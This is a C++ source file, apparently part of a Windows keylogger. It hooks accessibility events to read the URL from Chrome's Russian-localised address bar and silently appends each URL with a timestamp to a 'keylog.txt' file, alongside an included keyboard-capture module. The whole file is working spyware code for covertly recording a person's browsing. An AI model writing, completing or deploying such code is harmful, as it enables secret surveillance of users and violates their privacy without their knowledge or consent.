#include "url.h"
#include "../keyboard/keyboard.h"
#include <fstream>

HWINEVENTHOOK LHook = 0;

void flushUrl(std::string url) {
    std::ofstream myfile("../keylog.txt", std::ios::out | std::ios::app);
    if (myfile.is_open())
    {
        std::time_t logTime = system_clock::to_time_t(system_clock::now());
        myfile << std::ctime(&logTime) << "> " << url << '\n';
    }
    myfile.flush();
    myfile.close();
}



void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime) {
    IAccessible* pAcc = NULL;
    VARIANT varChild;
    if ((AccessibleObjectFromEvent(hwnd, idObject, idChild, &pAcc, &varChild) == S_OK) && (pAcc != NULL)) {
        char className[50];
        if (GetClassName(hwnd, className, 50) && strcmp(className, "Chrome_WidgetWin_1") == 0) {
            BSTR bstrName = nullptr;
            if (pAcc->get_accName(varChild, &bstrName) == S_OK) {
                if (wcscmp(bstrName, L"Адресная строка и строка поиска") == 0) {
                    BSTR bstrValue = nullptr;
                    if (pAcc->get_accValue(varChild, &bstrValue) == S_OK) {
                        // printf("URL change: %ls\n", bstrValue);
                        std::wstring wideString(bstrValue);
                        std::string narrowString(wideString.length(), 0);
                        WideCharToMultiByte(CP_UTF8, 0, wideString.c_str(), -1, &narrowString[0], narrowString.size(), NULL, NULL);

                        if (narrowString.length() > 0)
                            flushUrl(narrowString);
                        SysFreeString(bstrValue);
                    }
                }
                SysFreeString(bstrName);
            }
            pAcc->Release();
        }
    }
}


void hookUrl() {
    if (LHook != 0) return;
    CoInitialize(NULL);
    LHook = SetWinEventHook(EVENT_OBJECT_FOCUS, EVENT_OBJECT_VALUECHANGE, 0, WinEventProc, 0, 0, WINEVENT_SKIPOWNPROCESS);
}

void unhookUrl() {
    if (LHook == 0) return;
    UnhookWinEvent(LHook);
    CoUninitialize();
}